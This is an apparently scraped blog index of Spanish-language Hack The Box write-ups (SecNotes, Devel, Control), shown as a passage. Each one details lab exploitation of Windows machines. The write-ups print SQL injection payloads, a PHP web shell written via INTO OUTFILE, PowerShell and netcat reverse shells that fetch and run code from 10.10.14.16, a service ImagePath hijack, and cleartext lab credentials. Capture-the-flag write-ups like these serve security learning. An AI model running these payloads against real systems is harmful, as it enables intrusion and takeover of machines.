Scanning 10.10.10.97 [65535 ports] Discovered open port 80/tcp on 10.10.10.97 Discovered open port 445/tcp on 10.10.10.97 Connect Scan Timing: About 27.21% done; ETC: 12:58 (0:01:23 remaining) Discovered open port 8808/tcp on 10.10.10.97 Completed Connect Scan at 12:57, 71.58s elapsed (65535 total ports) Nmap scan report for 10.10.10.97 Host is up, received user-set (0.067s latency). Scanned at 2022-06-20 12:56:42 EDT for 71s Not shown: 65532 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 80/tcp open http syn-ack 445/tcp open microsoft-ds syn-ack 8808/tcp open ssports-bcast syn-ack Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 71.61 seconds Escaneo espec√≠fico ‚îî‚îÄ$ nmap -sCV -p 80,445,8808 -n -Pn -oN nmap/targeted $TARGET Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 13:01 EDT Nmap scan report for 10.10.10.97 Host is up (0.068s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-title: Secure Notes - Login |_Requested resource was login.php | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 445/tcp open microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB) 8808/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows |_http-server-header: Microsoft-IIS/10.0 Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required | smb2-time: | date: 2022-06-20T17:01:33 |_ start_date: N/A | smb-os-discovery: | OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3) | OS CPE: cpe:/o:microsoft:windows_10::- | Computer name: SECNOTES | NetBIOS computer name: SECNOTES\\x00 | Workgroup: HTB\\x00 |_ System time: 2022-06-20T10:01:31-07:00 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 51.84 seconds Enumeraci√≥n Servicios http - 80 Manual Se presenta un sistema de autenticaci√≥n permitiendo el registro y el acceso a una aplicaci√≥n para crear y guardar notas personales por usuario. Exponiendo diveras rutas, obtenidas al iteractuar manualmente con el sitio, para dar paso a posibles caminos de explotaci√≥n.\nPor ejemplo, se visualiz√≥ que el sitio est√° haciendo uso de PHP lo que pudiera significar que para interactuar (acciones CRUD de notas) por atr√°s se hace uso de alguna base de datos y esto se reducir√≠a a una posible inyecci√≥n SQL.\nOtra ruta expuesta, la cu√°l expone un posible usuario de sistema (tyler) y el dominio (secnotes.htb) es /contact.php. Bajo la suposici√≥n que tyler tambi√©n es un usuario de la plataforma se podr√≠a craftear un payload XSS que permitiera capturar su cookie de sesi√≥n.\nffuf Despu√©s de enumerar autom√°ticamente las rutas y subdominios, no se identific√≥ nada relevante para las futuras fases.\nhttp - 8808 Se presenta √∫nicamente el inicio por default de un servidor IIS, sin la obtenci√≥n de directorios existentes mediante el fuzzeo.\nExplotaci√≥n XSS Despu√©s de identificar la vulnerabilidad creando una nota para probar el payload y siendo que se tiene la ruta de contact.php se podr√≠a haber explotado si existiera interacci√≥n mediante lo enviado y lo recibido al usuario tyler@secnotes.htb. A pesar de funcionar, no fue el caso.\nPrueba de ejecuci√≥n\nSQL Injection Despu√©s de probar diferentes m√©todos tanto de manera manual como haciendo uso de sqlmap, principalmente en la creaci√≥n de notas, no se identific√≥ en esta secci√≥n, por lo que despu√©s de identificar que el usuario tambi√©n es mostrado en la visualizaci√≥n de las notas, se prob√≥ inyectar en este campo el payload.\nHaciendo uso de las 3 referencias marcadas relacionadas con la inyecci√≥n SQL, se procedi√≥ a ejecutar parte de la metodolog√≠a para encontrar un modo de obtener una shell. Por lo que como paso inicial se reconoci√≥ que se efectuaba la inyecci√≥n dado que al registrar un usuario ' se obtenia un error a la hora de hacer el logueo.\nError al loguear con credenciales.\nA lo que posteriormente se busc√≥ identificar el n√∫mero de columnas presentes en la tabla usada, registrado un usuario iteratibamente de 1 a N hasta que se desplegara un error (quinta iteraci√≥n) encontrando as√≠ el n√∫mero 4 mediante ' ORDER BY 4-- -.\nD√°ndole seguimiento al proceso se ejecut√≥ ' UNION SELECT 1,2,3,4-- - para identificar aquellas columnas que fueran cadenas para poder desplegar informaci√≥n all√≠, identificando as√≠ la 2,3 y 4.\nDe acuerdo a las referencias encontradas se asumi√≥ que el nombre de la tabla que conten√≠a las credenciales del sitio era com√∫n (users), por lo que no s√© necesit√≥ encontrar el nombre de las tablas y bases de datos, adem√°s de que se present√≥ una limitaci√≥n referente a la longitud en el campo de usuario, por consiguiente las consultas a inyectar quedaban un tanto restringidas pero mediante ' UNION SELECT 1,username,3,4 FROM users-- - y ' UNION SELECT 1,password,3,4 FROM users-- - se pudieron identificar los usuarios y sus contrase√±as, siendo relevante s√≥lo usuario tyler.\nHashes de usuarios\nDado que al buscar realizar el crackeo del hash obtenido tom√≥ tiempo significativo a la hora de su ejecuci√≥n, se decidi√≥ buscar y emplear otro payload que de alguna forma realizara un bypass al logueo de este usuario, empleando ' OR 1=1-- - para forzar un resultado booleano dado que se obtienen las notas del usuario en turno, logrando as√≠ el despliegue de las notas de todos los usuarios, exponiendo lo que por sintaxis se asume que son credenciales del servicio de smb.\n\\\\secnotes.htb\\new-site tyler / 92g!mA8BGjOirkL%OG*\u0026amp; Con las credenciales obtenidas se prob√≥ el acceso haciendo de uso de:\ncrackmapexec smb 10.10.10.97 -u tyler -p \u0026#39;92g!mA8BGjOirkL%OG*\u0026amp;\u0026#39; --shares Visualizando as√≠ los folders compartidos y pudiendo tener acceso de lectura y escritura a new-site.\nAl entrar al folder compartido con:\nsmbclient \\\\\\\\10.10.10.97\\\\new-site -U \u0026#39;tyler\u0026#39; Se visualizaron los archivos predeterminados en el servidor IIS por que se puede relacionar con el puerto 8808.\nRCE Al probar directamente la carga de un archivo que pudiera brindar ejecuci√≥n remota de instrucciones en el servicio de smb, se identific√≥ que en el escenario planteado no fueron funcionales las shells bajo las extensiones asp y aspx, dado que previamente se identific√≥ el uso de PHP, se prob√≥ una shell de este tipo.\nObteniendo as√≠ ejecuci√≥n de comandos.\nPara entablar una reverse shell, inicialmente se busc√≥ cargar el binario de netcat en la m√°quina, m√©todo que no funcion√≥ en esta ocasi√≥n, raz√≥n por la que se busco invocar la revershell de powershell ofrecida por nishang. Disponible tanto en el repositorio como en el manejador de paquetes de kali (sudo apt install nishang).\nDespu√©s de generar una copia y modificar el archivo /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1, a√±adiendo hasta el final la llamada a la funci√≥n:\nInvoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 443 Exponi√©ndola mediante un servicio web, se entabl√≥ una reverse shell satisfactoriamente mediante la invocaci√≥n de la request:\nhttp://10.10.10.97:8808/shell.php?cmd=powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/Invoke-PowerShellTcp.ps1') Post Explotaci√≥n Enumeraci√≥n Despu√©s de navegar a trav√©s del sistema de archivos se identific√≥ en la ruta C:\\ un archivo zip con el nombre de Ubuntu.zip adem√°s de encontrarse con la ruta C:\\Distros\\Ubuntu d√°ndo oportunidad para suponer que se trataba de la tecnolog√≠a empleada en sistemas windows, WSL (Windows Subsystem for Linux).\nAl ejecutar winPEAS se corrobor√≥ su existencia y se pudo identificar que el usuario por defecto en el sub-sistema es root mediante la invocaci√≥n de comandos como:\nwsl.exe whoami wsl.exe ls -la / Ejecuci√≥n de comandos mediante wsl.exe.\nEscalaci√≥n de privilegios tyler ‚Üí nt authority\\system Despu√©s de navegar en los directorios del sub-sistema se encontr√≥ la disponibilidad del archivo .bash_history del usuario root, exponiendo de esta manera la contrase√±a del usuario administrator de windows.\nDado que smbclient utiliza como separador el caracter % a diferencia de otras herramientas, se idenfic√≥ la contrase√±a como u6!4ZwgwOM#^OBf#Nwnh por lo que a partir de ah√≠ se entabl√≥ una reverse shell como administrador haciendo uso de:\nimpacket-psexec \u0026#39;administrator:u6!4ZwgwOM#^OBf#Nwnh@10.10.10.97\u0026#39; Notas adicionales Como es costumbre suelo comparar mi resoluci√≥n de la m√°quina tanto como con la oficial, como con la de otros (principalmente IppSec y 0xdf), para aprender otras t√©cnicas, procesos y mejorar continuamente, encontrando as√≠ otro m√©todo de explotaci√≥n disponible en la aplicaci√≥n web siendo √©sta la forma intencionada de explotaci√≥n.\nCross-Site Request Forgery (CSRF) En la plataforma es identificada la vulnerabilidad debido a que en la secci√≥n de cambio de contrase√±a, no se pide al usuario validar la contrase√±a actual, pidiendo solamente la nueva contrase√±a y la confirmaci√≥n de esta.\nLo que permite capturar la petici√≥n para visualizar como est√° construida y enviar una petici√≥n modificada al usuario de contacto para poder cambiar la contrase√±a de este.\nEnviando por medio de la secci√≥n de contacto el mensaje:\nhttp://10.10.10.97/change_pass.php?password=srrequiem\u0026amp;confirm_password=srrequiem\u0026amp;submit=submit Esperando que sea abierto y posteriormente corroborando su ejecuci√≥n al intentar loguearse como el usuario tyler:srrequiem, se obtiene acceso a las notas de tyler.\nReferencias  PortSwigger - SQL injection cheat sheet. PortSwigger - SQL injection UNION attacks. HackTricks - SQL injection. Github - Nishang. HackTricks - Windows Subsystem for Linux (wsl). Github - Impacket Suite.  ","permalink":"https://srrequiem.xyz/posts/htb-secnotes/","summary":"Estad√≠sticas    Caracter√≠stica Descripci√≥n     Nombre SecNotes   OS Windows   Dificultad oficial Medium   Dificultad de comunidad    Puntos 30   Creadores 0xdf    Reconocimiento Escaneo de host Escaneo completo de puertos ‚îî‚îÄ$ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower.","title":"Hack The Box - SecNotes"},{"content":"Estad√≠sticas    Caracter√≠stica Descripci√≥n     Nombre Devel   OS Windows   Dificultad oficial Easy   Dificultad de comunidad    Puntos 20   Creadores ch4p    Reconocimiento Escaneo de host Escaneo completo de puertos ‚îî‚îÄ$ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-16 10:23 EDT Initiating Connect Scan at 10:23 Scanning 10.10.10.5 [65535 ports] Discovered open port 21/tcp on 10.10.10.5 Discovered open port 80/tcp on 10.10.10.5 Connect Scan Timing: About 26.80% done; ETC: 10:25 (0:01:25 remaining) Completed Connect Scan at 10:25, 112.65s elapsed (65535 total ports) Nmap scan report for 10.10.10.5 Host is up, received user-set (0.064s latency). Scanned at 2022-06-16 10:23:39 EDT for 113s Not shown: 65533 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 21/tcp open ftp syn-ack 80/tcp open http syn-ack Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 112.68 seconds Escaneo espec√≠fico ‚îî‚îÄ$ nmap -sCV -p 80,21 -n -Pn -oN nmap/targeted $TARGET Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-16 10:29 EDT Nmap scan report for 10.10.10.5 Host is up (0.064s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 03-18-17 02:06AM \u0026lt;DIR\u0026gt; aspnet_client | 03-17-17 05:37PM 689 iisstart.htm |_03-17-17 05:37PM 184946 welcome.png 80/tcp open http Microsoft IIS httpd 7.5 |_http-title: IIS7 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 10.36 seconds Enumeraci√≥n Servicios ftp - 21 Si bien se busc√≥ analizar el servicio http, no se encontr√≥ nada relevante que pudiera sobresalir para la fase de explotaci√≥n, salvo la recopilaci√≥n de informaci√≥n ya presente en el escaneo de nmap el cu√°l presenta la versi√≥n del servidor IIS presente.\nAl identificar mediante el escaneo espec√≠fico de nmap el logueo por medio de la cuenta an√≥nima que ofrecen los servidores ftp, se busc√≥ ingresar para visualizar qu√© archivos se encontraban presentes y si adem√°s de permitir el listado de estos, se permit√≠a la escritura en el directorio.\nAl visualizar los archivos disponibles se identific√≥ que correspond√≠an con los archivos relacionados al servidor web en cuesti√≥n, por lo que al cargar un archivo de prueba se busc√≥ visualizarlo mediante el navegador, corroborando as√≠ un camino de explotaci√≥n mediante la ejecuci√≥n de c√≥digo.\nVisualizaci√≥n en navegador\nExplotaci√≥n RCE De acuerdo a la tecnolog√≠a empleada se busc√≥ cargar una webshell de asp para ejecutar comandos en la m√°quina, la cual se puede ubicar en /usr/share/webshells/asp.\nPor lo que despu√©s de la carga del binario de netcat mediante:\ncertutil.exe -f -urlcache http://10.10.14.16/nc.exe c:\\windows\\temp\\nc.exe Se obtuvo una reverse shell como iis apppool\\web entablandola con:\nc:\\windows\\temp\\nc.exe -e cmd.exe 10.10.14.16 1234 Reverse shell entablada:\nPost Explotaci√≥n Enumeraci√≥n Al identificar mediante systeminfo que se trataba de una versi√≥n vieja de Windows 7, sumando que en la misma informaci√≥n mostrada por el comando no se visualizaba ning√∫n parche instalado, se asumi√≥ que la ruta de escalaci√≥n iba intencionada a realizarse por medio de explotaci√≥n de kernel.\nEscalaci√≥n de privilegios nt apppool\\web ‚Üí nt authority\\system Despu√©s de ocupar el repositorio de exploits de kernel de windows para buscar alguno que fuera a la par de la fecha y acorde a la versi√≥n del sistema operativo, se encontr√≥ que el exploit relacionado a MS10-59 era operativo pero debido a que el presente en el repositorio es presentado mediante una prueba de concepto la cual retorna una shell lanzando otro proceso/ventana y no en la presente a donde se ejecuta.\nSe opt√≥ por buscar alguna otra prueba de concepto que permitiera otro enfoque, encontrando as√≠ otro repositorio del mismo exploit el cu√°l mediante la especificaci√≥n de la IP de escucha y puerto permite entablar una reverse shell como nt authority\\system, obteniendola mediante:\n.\\churri.exe 10.10.14.16 4321 Referencias  Windows Kernel Exploits. egre55 - MS10-059.  ","permalink":"https://srrequiem.xyz/posts/htb-devel/","summary":"Estad√≠sticas    Caracter√≠stica Descripci√≥n     Nombre Devel   OS Windows   Dificultad oficial Easy   Dificultad de comunidad    Puntos 20   Creadores ch4p    Reconocimiento Escaneo de host Escaneo completo de puertos ‚îî‚îÄ$ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower.","title":"Hack The Box - Devel"},{"content":"Estad√≠sticas    Caracter√≠stica Descripci√≥n     Nombre Control   OS Windows   Dificultad oficial Hard   Dificultad de comunidad    Puntos 40   Creadores TRX    Reconocimiento Escaneo de host Escaneo completo de puertos ‚îî‚îÄ$ sudo nmap -sS --min-rate 5000 -vvv -op√®n -p- -n -Pn -oG nmap/all_ports_ss $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Warning: The -o option is deprecated. Please use -oN Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 00:44 EDT Initiating SYN Stealth Scan at 00:44 Scanning 10.10.10.167 [65535 ports] Discovered open port 3306/tcp on 10.10.10.167 Discovered open port 135/tcp on 10.10.10.167 Discovered open port 80/tcp on 10.10.10.167 Discovered open port 49666/tcp on 10.10.10.167 Discovered open port 49667/tcp on 10.10.10.167 Completed SYN Stealth Scan at 00:45, 26.41s elapsed (65535 total ports) Nmap scan report for 10.10.10.167 Host is up, received user-set (0.064s latency). Scanned at 2022-06-07 00:44:41 EDT for 26s Not shown: 65530 filtered tcp ports (no-response) PORT STATE SERVICE REASON 80/tcp open http syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 3306/tcp open mysql syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 26.48 seconds Raw packets sent: 131084 (5.768MB) | Rcvd: 60 (2.496KB) Escaneo espec√≠fico ‚îî‚îÄ$ nmap -sCV -p 80,135,3306,49666,49667 -n -Pn -oN nmap/targeted $TARGET Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 00:45 EDT Nmap scan report for 10.10.10.167 Host is up (0.064s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Fidelity |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc Microsoft Windows RPC 3306/tcp open mysql? | fingerprint-strings: | NULL: |_ Host \u0026#39;10.10.14.16\u0026#39; is not allowed to connect to this MariaDB server 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3306-TCP:V=7.92%I=7%D=6/7%Time=629ED800%P=x86_64-pc-linux-gnu%r(NUL SF:L,4A,\u0026#34;F\\0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.14\\.16\u0026#39;\\x20is\\x20not\\x20allowe SF:d\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 61.09 seconds Enumeraci√≥n Servicios http - 80 Manual Visualmente no se identific√≥ nada relevante, dado que en su mayor√≠a los textos contienen Lorem ipsum salvo algunas rutas expuestas mediante a la interacci√≥n con parte de la interfaz. Visualizando as√≠ un error en la ruta admin.php despu√©s de dar click al bot√≥n de Login.\nAl navegar al c√≥digo fuente de la p√°gina inicial, se identificaron dos posibles pistas respecto a la construcci√≥n del sitio.\n  La exposici√≥n de c√≥digo del sitio functions.js.\n  Una posible ruta hacia otro host o algo similar.\n  Al navegar al script se pueden identificar rutas que pudieran formar parte de un CRUD y que dif√≠cilmente puedan ser encontradas en alg√∫n diccionario de fuzzing.\nAl identificar la composici√≥n de la petici√≥n e interactuar con view_products.php haciendo uso de:\ncurl -i http://10.10.10.167/view_product.php -X POST -F \u0026#34;productId=1\u0026#34; Se puede observar una tabla en html permitiendo la suposici√≥n de que se desplegar√≠an en este sitio los atributos del producto en cuesti√≥n.\nDespu√©s de varias iteraciones, buscando un identificador v√°lido (26) se puede visualizar que la suposici√≥n era la correcta.\nffuf Para complementar lo obtenido se buscaron rutas adicionales por medio de:\nffuf -c -ic -u http://10.10.10.167/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .txt,.bak,.php,.html Explotaci√≥n Inyecci√≥n SQL Ejecuci√≥n Teniendo en cuenta la tecnolog√≠a empleada y parte de los par√°metros usados, se busc√≥ explotar una inyecci√≥n SQL haciendo uso de sqlmap, utilizando:\nsqlmap -u \u0026#34;http://10.10.10.167/view_product.php\u0026#34; --data=\u0026#34;productId=1\u0026#34; --dbs Obteniendo de esta forma payloads v√°lidos y la capacidad de obtener los registros de la base de datos.\n Payload: productId=1 UNION ALL SELECT \u0026lt;query\u0026gt;-- -  Despu√©s no encontrar informaci√≥n relevante respecto a la aplicaci√≥n web, se busc√≥ obtener informaci√≥n respecto a los usuarios de la base de datos, mediante:\nsqlmap -u \u0026#34;http://10.10.10.167/view_product.php\u0026#34; --data=\u0026#34;productId=1\u0026#34; -D mysql -T user --passwords Obteniendo as√≠ sus hashes.\nA lo que posteriormente, una vez guardados se hizo uso de john para crackearlos.\nAdicional a ello, haciendo uso de CrackStation se obtuvo la contrase√±a de un hash adicional del cu√°l no se obtuvo con john.\nIdentificando as√≠ las credenciales:\nmanager:l3tm3!n hector:l33th4x0rhector RCE Despu√©s de obtener las credenciales y buscar emplearlas con los servicios expuestos en la m√°quina (mysql √∫nicamente dado que no se cuenta con smb o alg√∫n otro servicio en donde se pudieran haber usado) se busc√≥ la forma para que mediante la inyecci√≥n SQL se para pudiera lograr la ejecuci√≥n remota de c√≥digo mediante la escritura de un script en php, haciendo uso de instrucciones como INTO OUTFILE o INTO DUMPFILE.\nPara lograrlo fue necesario identificar el directorio en el que se encuentra la instalaci√≥n, de acuerdo al enlace encontrado se indica que por predeterminado la ruta suele ser c:\\inetpub\\wwwroot, permitiendo de esta forma complementar hacia d√≥nde deber√≠a dirigirse la escritura del script.\nDespu√©s de probar con diferentes payloads respecto al escape de las barras (\\), dado que la respuesta del servidor es identificada como un 500 Internal Server Error, se realiz√≥ una prueba de la escritura mediante:\ncurl -i http://10.10.10.167/view_product.php -X POST -F \u0026#34;productId=26 UNION ALL SELECT \u0026#39;Hello world\u0026#39; INTO OUTFILE \u0026#39;c:\\\\\\\\\\\\\\\\inetpub\\\\\\\\wwwroot\\\\\\\\test.txt\u0026#39;-- -\u0026#34; Logrando escribir satisfactoriamente al archivo indicado.\nEn este punto es importante recalcar para futuros escenarios similares que no siempre es verdad que porque la respuesta del servidor sea 500, significa que no se est√© ejecutando el payload indicado.\nVisualizandolo en el servidor.\nPermitiendo de esta manera cambiar el payload a\ncurl -i http://10.10.10.167/view_product.php -X POST -F \u0026#39;productId=26 UNION ALL SELECT \u0026#34;\u0026lt;?php system($_GET[\\\u0026#34;cmd\\\u0026#34;])?\u0026gt;\u0026#34; INTO OUTFILE \u0026#34;c:\\\\\\\\\\\\\\\\inetpub\\\\\\\\wwwroot\\\\\\\\srrequiem.php\u0026#34;-- -\u0026#39; Logrando as√≠ tener un script listo para ejecutar comandos en la m√°quina.\nPor lo que se estableci√≥ una reverse shell haciendo uso del binario nc.exe, subi√©ndolo a la m√°quina mediante la request:\nhttp://10.10.10.167/srrequiem.php?cmd=powershell.exe%20iwr%20http://10.10.14.16/nc.exe%20-outfile%20c:\\windows\\temp\\nc.exe Montando previamente el servidor web donde se encuentra el binario a descargar. Para ejecutarlo posteriormente con:\nhttp://10.10.10.167/srrequiem.php?cmd=c:\\windows\\temp\\nc.exe%20-e%20powershell.exe%2010.10.14.16%201234 Logrando as√≠ acceso de una manera m√°s interactiva.\nPost Explotaci√≥n Enumeraci√≥n Al buscar atar cabos sueltos respecto a lo indicado en el c√≥digo fuente del sitio, se pudo visualizar que en el contenido del script de admin.php se hace un filtrado de cabeceras indicado por HTTP_X_FORWARDED_FOR buscando la IP indicada 192.168.4.28. A lo que por consiguiente si se a√±adiera la cabecera X-Forwarded-For: 192.168.4.28 a las peticiones realizadas se visualizar√≠a el contenido de admin.php, logrando as√≠ un bypass de la validaci√≥n.\nEscalaci√≥n de privilegios nt authority\\iusr ‚Üí hector Habiendo identificado que existe el usuario hector en el sistema operativo por medio del listado de directorios de c:\\users, se dispuso a buscar la manera de ejecutar comandos mediante las credenciales obtenidas.\nHabiendo encontrado esta y esta referencias, se enviaron las siguientes instrucciones para lograr ejecutar comandos como el usuario hector.\nPreviamente identificando el nombre de la m√°quina y/o hostname con:\n# Cualquiera de los siguientes comandos hostname $env:COMPUTERNAME [Environment]::MachineName Seg√∫n lo indica este blog para encontrar ese valor y usarlo posteriormente.\n$userName = \u0026#39;fidelity\\hector\u0026#39; $userPassword = \u0026#39;l33th4x0rhector\u0026#39; $secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force $credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword) Invoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock { whoami } Logrando as√≠ ejecuci√≥n como el usuario hector.\nDadas las limitaciones que se obtuvieron al ejecutar el mismo binario de netcat previamente subido debido a permisos, se decidi√≥ ejecutar el mismo binario con la diferencia de ejecutarlo a trav√©s de red, exponiendo el binario mediante:\nimpacket-smbserver smbFolder $(pwd) -smb2support Y ejecut√°ndolo con:\nInvoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock { \\\\10.10.14.16\\smbFolder\\nc.exe -e cmd.exe 10.10.14.16 4321 } Obteniendo as√≠ una segunda revershell pero en esta ocasi√≥n como el usuario hector.\nhector ‚Üí nt authority\\system Buscando obtener informaci√≥n relevante para escalar como administrador, se ejecut√≥ winPEAS, identificando que se cuenta con un gran n√∫mero de registros a los cuales se tiene acceso completo.\nBajo el conocimiento de escenarios previos, se sabe que es posible modificar la configuraci√≥n de los servicios para poder secuestrar la ruta del binario, si se lograra identificar un servicio que se estuviera ejecutando como administrador al lograr la modificaci√≥n e iniciar el servicio se obtendr√≠a acceso como administrador. Dichas configuraciones de servicios se suelen encontrar en los valores de los registros mostrados, por lo que, se realiz√≥ un filtrado de estos servicios bajo su perfil de ejecuci√≥n y status para que a la hora de modificarlo se pudiera iniciar el servicio.\n$services = Get-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Services\\* # Para obtener todos los servicios $filtered_services = $services | where { ($_.ObjectName -match \u0026#39;LocalSystem\u0026#39;) -And ($_.Start -match \u0026#39;3\u0026#39;) } # Para filtar y obtener los servicios que se ejecuten con permisos elevados y que se puedan iniciar manualmente En este punto quedar√≠a filtrar los servicios a los que el usuario hector cuenta con permisos para iniciar cualquier servicio. Para esto se requiere identificar el servicio que cuente con la cadena RP seg√∫n es especificado en este blog en la propiedad de Sddl de los permisos desplegados de la lista actual de servicios.\nLo que individualmente por servicio es ubicado en la propiedad Security, en donde se encuentra en forma binaria.\nTrasladandolo a una lectura similar a la propiedad sddl, se puede ejecutar cmd /c sc sdshow wuauserv para visualizar el valor de mejor manera.\nIgualmente, el resultado no es entendible a menos que se busque alguna referencia para comparar, por lo que se puede hacer uso de:\nConvertFrom-SDDLString -Sddl \u0026#34;D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)\u0026#34; Para visualizarlo de mejor manera ya que se permite su conversi√≥n mediante powershell.\nPor lo que se iter√≥ en la lista previa de servicios la b√∫squeda de este permiso mediante el siguiente ciclo:\n$services_names = $filtered_services.pschildname foreach ($service in $services_names) { $sddl = (cmd /c sc sdshow $service) if ($sddl -match \u0026#34;RP[A-Z]*?;;;AU\u0026#34;) { $service } } # Iteraci√≥n en una l√≠nea $canStartServices = foreach ($service in $services_names) {$sddl = (cmd /c sc sdshow $service); if ($sddl -match \u0026#34;RP[A-Z]*?;;;AU\u0026#34;) { $service }} Dando como resultado la lista de los servicios buscados.\nObteniendo lo anterior se puede modificar la propiedad ImagePath del servicio y ejecutar lo que se desee una vez que el servicio sea iniciado. Se puede lograr este comportamiento tanto como haciendo uso de cmd como de powershell.\nUsando powershell Mediante powershell habr√≠a que:\n  Asegurar encontrarse en la ruta de los registros:\ncd HKLM:\\system\\currentcontrolset\\services   Obtener las propiedades del servicio requerido:\nget-item -path seclogon   Visualizar el valor a cambiar de ImagePath\n    Ejecutar (para modificar los valores con los deseados):\nset-itemproperty seclogon -name imagepath -value \u0026#34;\\\\10.10.14.16\\smbFolder\\nc.exe -e cmd.exe 10.10.14.16 443\u0026#34;   Obtener las propiedades del servicio requerido seclogon para validar el cambio.\n  Visualizar el cambio realizado a ImagePath.\n  El cual al montar la conexi√≥n de escucha, bastar√≠a con iniciar el servicio con:\nstart-service seclogon Para as√≠ ejecutar el binario indicado.\nUsando cmd Mediante cmd se realizar√≠a el mismo procedimiento con respectivos cambios en los comandos debido que powershell configura alias en algunos comandos, por lo que, se ejecutar√≠a:\n  Para visualizar los valores del servicio:\nreg query HKLM\\system\\currentcontrolset\\services\\seclogon   Para cambiar los valores de la propiedad ImagePath de acuerdo a lo encontrado en este blog para realizar los cambios e identificar el tipo de dato a cambiar REG_EXPAND_SZ para efectuarlo correctamente:\nreg add HKLM\\system\\currentcontrolset\\services\\seclogon /v ImagePath /t REG_EXPAND_SZ /d \u0026#34;\\\\10.10.14.16\\smbFolder\\nc.exe -e cmd.exe 10.10.14.16 443\u0026#34; /f   Para iniciar el servicio:\nsc start seclogon   Notas adicionales Mientras resolv√≠a la m√°quina encontr√© diversos problemas para ejecutar el mismo binario de netcat, ya hubiera sido si lo cargaba directamente a la m√°quina o lo ejecutaba a trav√©s del cliente smb, logr√© solucionarlo empleando otra subida de netcat mediante el usuario obtenido conforme iba realizando la escalaci√≥n de privilegios.\nDado que durante el proceso de resoluci√≥n personalmente busco lo equivalente a comparar respuestas en una evaluaci√≥n por lo que, suelo leer write-ups y ver walkthroughs de otros usuarios principalmente de 0xdf e IppSec, not√© que ambos hicieron referencia a AppLocker ya que el mismo problema se present√≥. Despu√©s de buscar m√°s informaci√≥n al respecto, encontr√© que existen rutas en Windows las cuales suelen estar libres de estas restricciones, encontrando varias listas de estas rutas en repositorios de github d√°ndole motivo al uso de la ruta C:\\Windows\\System32\\spool\\drivers\\color que se emplea en los write-ups.\nReferencias  SQL Injection. CrackStation. SQLI to RCE. How to: Find the Web Application Root. How to use Start Process in PowerShell. Running commands in a specific user context in PowerShell. StackOverflow - PowerShell Jobs vs Start-Process. Powershell get computer name. How to edit the Registry using Command Prompt on Windows 10. Significado del valor Start en registros. Start Stop service rights to non administrators. What is AppLocker?. Ultimate AppLocker ByPass List.  ","permalink":"https://srrequiem.xyz/posts/htb-control/","summary":"Estad√≠sticas    Caracter√≠stica Descripci√≥n     Nombre Control   OS Windows   Dificultad oficial Hard   